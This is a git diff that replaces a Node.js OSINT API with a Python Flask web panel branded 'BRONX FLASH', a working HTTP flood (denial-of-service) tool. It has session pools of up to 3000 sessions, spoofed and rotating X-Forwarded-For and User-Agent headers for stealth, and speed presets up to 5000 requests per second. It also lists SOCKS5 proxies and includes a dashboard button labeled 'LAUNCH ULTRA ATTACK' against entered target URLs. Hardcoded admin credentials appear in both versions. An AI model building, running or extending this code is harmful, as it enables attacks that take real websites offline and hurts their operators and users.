@@ -1,309 +1,737 @@
-// api/index.js - BRONX OSINT V100 ULTRA PRIME - ALL IN ONE
-const express = require('express');
-const axios = require('axios');
-const app = express();
+from flask import Flask, request, jsonify, render_template_string, make_response
+import requests
+import threading
+import time
+import random
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+import json
+import os
+import socket
+import struct
+from collections import defaultdict
+urllib3.disable_warnings()
 
-const REAL_API_BASE = 'https://ft-osint-api.duckdns.org/api';
-const REAL_API_KEY = process.env.REAL_API_KEY || 'bot-new';
-const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'BRONX_ULTRA';
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'king5';
-const MASTER_API_KEY = process.env.MASTER_API_KEY || 'BRONX_MASTER_' + Math.random().toString(36).substring(2, 10).toUpperCase();
-const STORAGE_URL = 'https://bronx-db.up.railway.app';
+app = Flask(__name__)
 
-let keyStorage = {};
-let customAPIs = [];
-let requestLogs = [];
-let adminSessions = {};
-let permanentTokens = {};
-let bannedIPs = [];
-let cooldownTimers = {};
+ADMIN_USER = "bronx"
+ADMIN_PASS = "ultra2026"
 
-// ========== STORAGE (RAILWAY DB) ==========
-async function saveToStorage() {
-    try {
-        await axios.post(`${STORAGE_URL}/api_keys`, { 
-            keys: keyStorage, apis: customAPIs, tokens: permanentTokens, 
-            banned: bannedIPs, logs: requestLogs.slice(-100) 
-        }, { timeout: 10000, headers: { 'Content-Type': 'application/json' } });
-        console.log('💾 Saved! Keys:', Object.keys(keyStorage).length);
-    } catch (e) { console.log('Save err:', e.message); }
+# ============================================
+# ULTRA FAST SESSION POOL (3000 Sessions)
+# ============================================
+session_pool = []
+session_lock = threading.Lock()
+MAX_SESSIONS = 3000
+stats_lock = threading.Lock()
+
+# Generate random IPs for spoofing
+def generate_random_ip():
+    """Generate random IP addresses for X-Forwarded-For spoofing"""
+    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+
+# Pre-generated IP pool for ultra speed
+IP_POOL = [generate_random_ip() for _ in range(10000)]
+
+# Pre-generated User-Agents
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+
+# Accept headers rotation
+ACCEPT_HEADERS = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+]
+
+# Accept-Language rotation
+LANGUAGES = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.8",
+    "en-US,en;q=0.9,es;q=0.8",
+    "en-US,en;q=0.9,fr;q=0.8",
+    "en-CA,en;q=0.9",
+    "en-AU,en;q=0.8",
+]
+
+def create_ultra_session():
+    """Create ultra-fast session with random fingerprint"""
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": random.choice(ACCEPT_HEADERS),
+        "Accept-Language": random.choice(LANGUAGES),
+        "Accept-Encoding": "gzip, deflate, br",
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "Pragma": "no-cache",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1",
+        "X-Forwarded-For": random.choice(IP_POOL),
+        "X-Real-IP": random.choice(IP_POOL),
+        "X-Client-IP": random.choice(IP_POOL),
+    })
+    # Disable keep-alive for faster connections
+    s.headers["Connection"] = "close"
+    return s
+
+def initialize_session_pool():
+    """Initialize the 3000 session pool"""
+    global session_pool
+    with session_lock:
+        print(f"⚡ Creating {MAX_SESSIONS} ULTRA sessions...")
+        for i in range(0, MAX_SESSIONS, 100):
+            batch = [create_ultra_session() for _ in range(100)]
+            session_pool.extend(batch)
+            print(f"   📦 {min(i+100, MAX_SESSIONS)}/{MAX_SESSIONS} sessions ready")
+    print(f"✅ {len(session_pool)} ULTRA sessions initialized!")
+
+def get_ultra_session():
+    """Get random session with random IP"""
+    with session_lock:
+        if len(session_pool) < 100:
+            # Quick refill
+            session_pool.extend([create_ultra_session() for _ in range(200)])
+        s = random.choice(session_pool)
+        # Rotate IP on every use for maximum stealth
+        s.headers.update({
+            "X-Forwarded-For": random.choice(IP_POOL),
+            "X-Real-IP": random.choice(IP_POOL),
+            "X-Client-IP": random.choice(IP_POOL),
+            "User-Agent": random.choice(USER_AGENTS),
+        })
+        return s
+
+# ============================================
+# ULTRA FAST ATTACK SYSTEM
+# ============================================
+active_attacks = {}
+attack_stats = {"success": 0, "failed": 0, "total": 0}
+attack_logs = []
+custom_proxies = []
+total_lifetime = {"success": 0, "failed": 0, "total": 0}
+rate_limit_config = {"enabled": False, "rpm": 15}
+multi_session_config = {"enabled": True, "sessions_per_url": 100, "rotating": True}
+ip_log = []
+
+CF_IPS = [
+    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
+    "104.16.0.1","104.16.0.2","104.16.0.3",
+    "172.67.0.1","172.67.0.2"
+]
+
+SOCKS5_PROXIES = [
+    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
+    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
+    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
+    "173.212.239.43:1080"
+]
+
+# ULTRA SPEED CONFIG (Real 2000+ RPS)
+SPEEDS = {
+    "slow": {"rate": 10, "delay": 0.01, "workers": 10, "sessions": 20},
+    "fast": {"rate": 50, "delay": 0.005, "workers": 25, "sessions": 50},
+    "veryfast": {"rate": 200, "delay": 0.001, "workers": 50, "sessions": 100},
+    "ultra": {"rate": 500, "delay": 0.0005, "workers": 100, "sessions": 200},
+    "lightning": {"rate": 1000, "delay": 0.0001, "workers": 200, "sessions": 500},
+    "flash": {"rate": 2000, "delay": 0.00005, "workers": 400, "sessions": 1000},
+    "godkiller": {"rate": 3000, "delay": 0.00001, "workers": 600, "sessions": 2000},
+    "ultragod": {"rate": 5000, "delay": 0, "workers": 800, "sessions": 3000}
 }
 
-async function loadFromStorage() {
-    try {
-        const res = await axios.get(`${STORAGE_URL}/api_keys`, { timeout: 10000 });
-        if (res.data) {
-            const d = res.data;
-            if (d.keys && Object.keys(d.keys).length > 0) { keyStorage = d.keys; if(!keyStorage[MASTER_API_KEY]) keyStorage[MASTER_API_KEY] = createMasterKey(); }
-            if (d.apis && Array.isArray(d.apis) && d.apis.length > 0) customAPIs = d.apis;
-            if (d.tokens) { permanentTokens = d.tokens; Object.entries(permanentTokens).forEach(([t]) => { adminSessions[t] = { expiresAt: Date.now() + 365*24*60*60*1000, permanent: true }; }); }
-            if (d.banned) bannedIPs = d.banned;
-            if (d.logs && Array.isArray(d.logs)) requestLogs = d.logs;
-            return Object.keys(keyStorage).length > 0;
-        }
-        return false;
-    } catch (e) { return false; }
+EFFECTS = ["snow","matrix","particles","neon","firefly","glitch","pulse","scanlines","bubbles","stars","cyber","quantum"]
+
+# ============================================
+# ULTRA FAST ATTACK ENGINE (MULTI-IP)
+# ============================================
+def ultra_fast_request(url, session, mode, spoofed_ip):
+    """Ultra fast request with IP spoofing"""
+    try:
+        # Update headers with new spoofed IP for EVERY request
+        session.headers.update({
+            "X-Forwarded-For": spoofed_ip,
+            "X-Real-IP": spoofed_ip,
+            "X-Client-IP": spoofed_ip,
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept": random.choice(ACCEPT_HEADERS),
+            "Accept-Language": random.choice(LANGUAGES),
+        })
+        
+        if mode == "cf":
+            cf_ip = random.choice(CF_IPS)
+            session.get(f"https://{cf_ip}", timeout=3, verify=False)
+            return True
+        elif mode == "mixed":
+            # Randomly choose method for each request
+            methods = ["direct", "cf", "spoof"]
+            chosen = random.choice(methods)
+            if chosen == "cf":
+                cf_ip = random.choice(CF_IPS)
+                session.get(f"https://{cf_ip}", timeout=3, verify=False)
+            else:
+                session.get(url, timeout=3, verify=False)
+            return True
+        else:
+            # Direct with spoofed IP
+            session.get(url, timeout=3, verify=False)
+            return True
+    except:
+        return False
+
+def attack_burst_worker(attack_id, url, total_count, delay, mode, session_count):
+    """Ultra fast burst worker - sends requests in rapid bursts"""
+    sessions = [get_ultra_session() for _ in range(session_count)]
+    count_per_session = max(1, total_count // len(sessions))
+    
+    def burst_attack(session, count):
+        """Send requests as fast as possible"""
+        success_count = 0
+        fail_count = 0
+        for _ in range(count):
+            if attack_id not in active_attacks:
+                break
+            
+            # Rate limiter check (skip if disabled for speed)
+            if rate_limit_config["enabled"]:
+                time.sleep(60 / rate_limit_config["rpm"])
+            
+            # Get random spoofed IP
+            spoofed_ip = random.choice(IP_POOL)
+            
+            # Send request
+            if ultra_fast_request(url, session, mode, spoofed_ip):
+                success_count += 1
+            else:
+                fail_count += 1
+            
+            # Minimal delay for ultra speed
+            if delay > 0 and random.random() < 0.3:  # Only delay 30% of requests
+                time.sleep(delay)
+        
+        # Batch update stats (reduces lock contention)
+        with stats_lock:
+            attack_stats["success"] += success_count
+            attack_stats["failed"] += fail_count
+            attack_stats["total"] += success_count + fail_count
+            total_lifetime["success"] += success_count
+            total_lifetime["failed"] += fail_count
+            total_lifetime["total"] += success_count + fail_count
+    
+    # Launch all sessions simultaneously
+    threads = []
+    for session in sessions:
+        t = threading.Thread(target=burst_attack, args=(session, count_per_session))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    for t in threads:
+        t.join(timeout=120)
+
+def run_ultra_attack(attack_id, urls, count, speed, mode):
+    """Run ultra fast multi-IP attack"""
+    config = SPEEDS.get(speed, SPEEDS["ultragod"])
+    
+    if multi_session_config["enabled"]:
+        sessions_per_url = min(config["sessions"], multi_session_config["sessions_per_url"])
+    else:
+        sessions_per_url = max(10, config["sessions"] // len(urls))
+    
+    workers_per_url = max(1, config["workers"] // len(urls))
+    
+    # Use ThreadPoolExecutor for parallel URL attacks
+    with ThreadPoolExecutor(max_workers=min(workers_per_url * len(urls), 1000)) as executor:
+        futures = []
+        for url in urls:
+            for _ in range(workers_per_url):
+                future = executor.submit(
+                    attack_burst_worker,
+                    attack_id, url,
+                    count // workers_per_url,
+                    config["delay"],
+                    mode,
+                    sessions_per_url // workers_per_url
+                )
+                futures.append(future)
+        
+        # Wait for completion
+        for future in as_completed(futures):
+            try:
+                future.result(timeout=60)
+            except:
+                pass
+    
+    if attack_id in active_attacks:
+        del active_attacks[attack_id]
+    
+    attack_logs.append(f"✅ ULTRA Attack Complete: {len(urls)} targets")
+
+# ============================================
+# HTML TEMPLATES
+# ============================================
+LOGIN = r"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v21 ULTRA</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
+body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,85,0.03) 1px,transparent 1px);background-size:30px 30px;animation:bgMove 15s linear infinite}
+@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(30px,30px)}}
+.effect-layer{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+.box{background:rgba(5,0,10,0.97);padding:45px;border-radius:20px;border:1px solid rgba(255,0,85,0.15);width:400px;text-align:center;z-index:1;box-shadow:0 0 80px rgba(255,0,85,0.1),0 0 150px rgba(0,200,255,0.03);animation:pulseBox 3s infinite}
+@keyframes pulseBox{50%{box-shadow:0 0 120px rgba(255,0,85,0.25),0 0 200px rgba(0,200,255,0.08)}}
+.logo{font-size:3.5em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 25px rgba(255,0,85,0.7))}}
+h1{font-size:1.8em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px;animation:textShine 3s infinite}
+@keyframes textShine{50%{filter:brightness(1.2)}}
+.tag{color:#555;font-size:0.65em;letter-spacing:4px;text-transform:uppercase;margin:8px 0}
+input{width:100%;padding:14px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:10px;color:#fff;margin:8px 0;font-size:14px;transition:0.3s}
+input:focus{border-color:#ff0055;box-shadow:0 0 25px rgba(255,0,85,0.15);outline:none}
+.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;margin-top:12px;letter-spacing:2px;text-transform:uppercase;transition:0.3s;position:relative;overflow:hidden}
+.btn:hover{box-shadow:0 0 50px rgba(255,0,85,0.6);transform:translateY(-2px)}.btn:active{transform:scale(0.96)}
+.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.15),transparent);animation:btnShine 2s infinite}
+@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
+.badge{display:inline-block;padding:6px 16px;background:rgba(255,0,85,0.08);border:1px solid rgba(255,0,85,0.2);border-radius:16px;color:#ff0055;font-size:0.6em;letter-spacing:2px;margin-top:8px;animation:badgePulse 2s infinite}
+@keyframes badgePulse{50%{box-shadow:0 0 25px rgba(255,0,85,0.25)}}
+</style></head><body>
+<div class="effect-layer" id="effects"></div>
+<div class="box">
+<div class="logo">💀</div>
+<h1>BRONX FLASH</h1>
+<div class="tag">v21 ULTRA • GOD KILLER</div>
+<p style="color:#444;font-size:0.55em;letter-spacing:1px">5000 RPS • MULTI-IP • 3000 SESSIONS</p>
+<div class="badge">⚡ ULTRA GOD ENGINE ⚡</div>
+<form method="post">
+<input type="text" name="user" placeholder="Username">
+<input type="password" name="pass" placeholder="Password">
+<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
+</form>
+{% if error %}<p style="color:#ff0055;margin-top:8px;font-size:0.8em">{{ error }}</p>{% endif %}
+</div>
+<script>
+(function(){
+var effect='{{ effect }}';
+var el=document.getElementById('effects');
+var style=document.createElement('style');
+style.textContent='@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-25px)scale(1.3)}}@keyframes twinkle{50%{opacity:0.15}}@keyframes pulseNeon{50%{opacity:0.5}}@keyframes cyberFall{to{transform:translateY(110vh)}}@keyframes quantum{0%,100%{transform:translate(0,0)scale(1);opacity:1}25%{transform:translate(15px,-15px)scale(1.4);opacity:0.4}50%{transform:translate(-15px,8px)scale(0.7);opacity:0.7}75%{transform:translate(8px,15px)scale(1.2);opacity:0.3}}';
+document.head.appendChild(style);
+function makeEl(t,c,s){var d=document.createElement('div');d.style.cssText=s;if(c)d.innerHTML=c;el.appendChild(d);return d;}
+if(effect==='snow')for(var i=0;i<35;i++)makeEl('div','❄️','position:absolute;color:#ff0055;font-size:'+(Math.random()*8+6)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*4+2)+'s linear infinite;pointer-events:none');
+if(effect==='matrix')for(var i=0;i<45;i++)makeEl('div',String.fromCharCode(0x30A0+Math.random()*96),'position:absolute;color:#00ff88;font-size:'+(Math.random()*10+5)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*2+1.5)+'s linear infinite;pointer-events:none');
+if(effect==='particles')for(var i=0;i<25;i++)makeEl('div','','position:absolute;width:'+(Math.random()*2+1)+'px;height:'+(Math.random()*2+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+(Math.random()*3+2)+'s ease-in-out infinite;border-radius:50%;pointer-events:none');
+if(effect==='cyber')for(var i=0;i<35;i++)makeEl('div',Math.random()>0.5?'▓':'▒','position:absolute;color:#00c8ff;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:cyberFall '+(Math.random()*1.5+0.8)+'s linear infinite;pointer-events:none');
+if(effect==='stars')for(var i=0;i<20;i++)makeEl('div','','position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+(Math.random()*1.5+0.8)+'s infinite;pointer-events:none');
+if(effect==='quantum')for(var i=0;i<20;i++)makeEl('div','','position:absolute;width:3px;height:3px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:quantum '+(Math.random()*2+1.5)+'s infinite;border-radius:50%;box-shadow:0 0 15px #ffd700;pointer-events:none');
+if(effect==='neon'){el.style.background='radial-gradient(circle,rgba(255,0,85,0.04),transparent)';el.style.animation='pulseNeon 2s infinite';}
+if(effect==='firefly')for(var i=0;i<30;i++){var f=makeEl('div','','position:absolute;width:4px;height:4px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:float '+(Math.random()*2+1)+'s ease-in-out infinite;border-radius:50%;box-shadow:0 0 10px #ffd700,0 0 20px #ffd700;pointer-events:none');}
+})();
+</script>
+</body></html>"""
+
+DASH = r"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v21 ULTRA</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:15px;line-height:1.4}
+.effect-layer{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+.container{max-width:1400px;margin:0 auto;position:relative;z-index:1}
+.header{display:flex;justify-content:space-between;align-items:center;padding:18px 25px;border:1px solid rgba(255,255,255,0.05);border-radius:14px;margin-bottom:18px;background:rgba(255,255,255,0.01);flex-wrap:wrap;gap:12px;animation:headerGlow 3s infinite}
+@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.25);box-shadow:0 0 25px rgba(255,0,85,0.08)}}
+.header h1{font-size:1.6em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
+.stat{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:16px;text-align:center;transition:0.3s}.stat:hover{border-color:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.15)}
+.stat-val{font-size:2em;font-weight:800}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}
+.stat-label{font-size:0.55em;text-transform:uppercase;letter-spacing:2px;color:#555;margin-top:4px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:14px;margin-bottom:18px}
+.card{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;transition:0.3s}.card:hover{border-color:rgba(255,0,85,0.15)}
+.card h3{font-size:0.7em;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;color:#666}
+input,select,textarea{width:100%;padding:10px 12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:7px;color:#fff;margin:4px 0;font-size:12px;font-family:inherit;resize:vertical;transition:0.2s}
+input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.1);outline:none}
+label{font-size:0.55em;text-transform:uppercase;letter-spacing:1.5px;color:#555;display:block;margin-top:8px}
+.btn{width:100%;padding:11px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:7px;font-weight:600;cursor:pointer;font-size:0.7em;letter-spacing:1.5px;text-transform:uppercase;transition:0.3s;margin:4px 0;position:relative;overflow:hidden}
+.btn:hover{box-shadow:0 0 35px rgba(255,0,85,0.4);transform:translateY(-1px)}.btn:active{transform:scale(0.97)}
+.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.12),transparent);animation:shine 2s infinite}
+@keyframes shine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
+.btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.08)}.btn-secondary:hover{box-shadow:0 0 15px rgba(255,255,255,0.08);color:#fff}
+.btn-danger{background:rgba(255,0,0,0.12);color:#ff4444;border:1px solid rgba(255,0,0,0.15)}.btn-danger:hover{box-shadow:0 0 20px rgba(255,0,0,0.25)}
+.btn-reset{background:rgba(255,215,0,0.12);color:#ffd700;border:1px solid rgba(255,215,0,0.15)}.btn-reset:hover{box-shadow:0 0 20px rgba(255,215,0,0.25)}
+.btn-cyan{background:rgba(0,200,255,0.12);color:#00c8ff;border:1px solid rgba(0,200,255,0.15)}.btn-cyan:hover{box-shadow:0 0 20px rgba(0,200,255,0.25)}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+.logs{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.03);border-radius:8px;padding:12px;max-height:280px;overflow:auto;font-size:0.65em;font-family:'SF Mono',monospace;color:#00ff88}
+.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.01);color:#888}
+.badge{display:inline-block;padding:4px 12px;border-radius:16px;font-size:0.55em;letter-spacing:1.5px;text-transform:uppercase}
+.badge-active{background:rgba(255,0,85,0.12);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.3}}
+.badge-multi{background:rgba(0,200,255,0.12);color:#00c8ff;animation:blink 1s infinite}
+.toggle-row{display:flex;align-items:center;gap:10px;margin:8px 0}
+.toggle{width:40px;height:22px;background:rgba(255,255,255,0.06);border-radius:11px;cursor:pointer;position:relative;transition:0.3s}
+.toggle.on{background:#ff0055;box-shadow:0 0 15px rgba(255,0,85,0.3)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:18px;height:18px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:20px}
+.footer{text-align:center;padding:15px;color:rgba(255,255,255,0.1);font-size:0.55em;letter-spacing:2px}
+.effect-select{display:flex;flex-wrap:wrap;gap:4px;margin:4px 0}
+.effect-opt{padding:5px 10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:16px;color:#666;font-size:0.55em;cursor:pointer;transition:0.2s;letter-spacing:1px}
+.effect-opt:hover,.effect-opt.active{border-color:#ff0055;color:#ff0055;background:rgba(255,0,85,0.08)}
+.session-info{background:rgba(0,200,255,0.04);border:1px solid rgba(0,200,255,0.1);border-radius:8px;padding:12px;margin:8px 0;text-align:center}
+.session-count{font-size:2.5em;font-weight:800;color:#00c8ff;animation:sessionPulse 2s infinite}
+@keyframes sessionPulse{50%{text-shadow:0 0 35px rgba(0,200,255,0.5)}}
+</style></head><body>
+<div class="effect-layer" id="effects"></div>
+<div class="container">
+<div class="header">
+<div><h1>⚡ BRONX FLASH v21 ULTRA</h1><div style="color:#444;font-size:0.55em;letter-spacing:2px">5000 RPS • MULTI-IP • 3000 SESSIONS • GOD KILLER</div></div>
+<div style="display:flex;gap:8px;align-items:center">
+<span style="color:#555;font-size:0.55em" id="liveTime"></span>
+<a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.65em;letter-spacing:1.5px">DISCONNECT</a>
+</div>
+</div>
+
+<div class="stats">
+<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Success</div></div>
+<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div>
+<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Total</div></div>
+</div>
+
+<div class="stats" style="grid-template-columns:repeat(4,1fr)">
+<div class="stat"><div class="stat-val t" style="font-size:1.5em" id="ltSuccess">0</div><div class="stat-label">🏆 Lifetime Wins</div></div>
+<div class="stat"><div class="stat-val t" style="font-size:1.5em" id="ltTotal">0</div><div class="stat-label">📊 Lifetime Total</div></div>
+<div class="stat"><div class="stat-val" style="font-size:1.5em;color:#00c8ff" id="activeSessions">0</div><div class="stat-label">🔗 Active</div></div>
+<div class="stat"><div class="stat-val" style="font-size:1.5em;color:#ffd700" id="poolSize">3000</div><div class="stat-label">📦 Pool</div></div>
+</div>
+
+<div class="grid">
+<div class="card">
+<h3>🎯 Attack Configuration</h3>
+<label>Target URLs (One per line)</label>
+<textarea id="urls" rows="2" placeholder="https://target1.com&#10;https://target2.com"></textarea>
+<div class="row"><div><label>Requests per URL</label><input type="number" id="count" value="10000"></div><div>
+<label>Speed Mode</label><select id="speed">
+<option value="slow">🐢 Slow (10/s)</option>
+<option value="fast">⚡ Fast (50/s)</option>
+<option value="veryfast">🔥 Very Fast (200/s)</option>
+<option value="ultra">💀 Ultra (500/s)</option>
+<option value="lightning">⚡ Lightning (1000/s)</option>
+<option value="flash">💎 FLASH (2000/s)</option>
+<option value="godkiller">☠️ GOD KILLER (3000/s)</option>
+<option value="ultragod" selected>👑 ULTRA GOD (5000/s)</option>
+</select></div></div>
+<label>Attack Mode</label><select id="mode">
+<option value="direct">Direct (Fast)</option>
+<option value="mixed" selected>Mixed IP (Stealth)</option>
+<option value="cf">Cloudflare IP</option>
+</select>
+<button class="btn" onclick="start()">🚀 LAUNCH ULTRA ATTACK</button>
+<button class="btn btn-danger" onclick="stop()">⏹️ TERMINATE ALL</button>
+<div id="status" style="margin-top:6px"></div>
+</div>
+
+<div class="card">
+<h3>⚡ Multi-IP Session Engine</h3>
+<div class="session-info">
+<div class="session-count" id="sessionDisplay">3000</div>
+<div style="color:#888;font-size:0.55em;letter-spacing:1.5px">ACTIVE SESSION POOL (MULTI-IP)</div>
+</div>
+<div class="toggle-row"><span style="font-size:0.65em;color:#666">Multi-Session</span><div class="toggle on" id="multiToggle" onclick="toggleMulti()"></div><span id="multiLabel" style="font-size:0.65em;color:#00c8ff">ON</span></div>
+<div class="toggle-row"><span style="font-size:0.65em;color:#666">IP Rotation</span><div class="toggle on" id="rotateToggle" onclick="toggleRotate()"></div><span id="rotateLabel" style="font-size:0.65em;color:#00c8ff">ON</span></div>
+<label>Sessions Per URL</label><input type="number" id="sessionsPerUrl" value="200" min="1" max="3000">
+<button class="btn btn-cyan" onclick="saveMultiSession()">💾 Save Config</button>
+<button class="btn btn-reset" onclick="refreshSessions()">🔄 Refresh Pool</button>
+</div>
+
+<div class="card">
+<h3>⚙️ Rate Limiter</h3>
+<div class="toggle-row"><span style="font-size:0.65em;color:#666">Rate Limiter</span><div class="toggle" id="rateToggle" onclick="toggleRate()"></div><span id="rateLabel" style="font-size:0.65em;color:#666">OFF</span></div>
+<label>Requests Per Minute</label><input type="number" id="rpm" value="15">
+<button class="btn btn-secondary" onclick="saveRate()">💾 Save</button>
+</div>
+
+<div class="card">
+<h3>🔧 Proxy System</h3>
+<div class="toggle-row"><span style="font-size:0.65em;color:#666">Proxy System</span><div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.65em;color:#666">OFF</span></div>
+<label>Custom Proxies (IP:Port)</label>
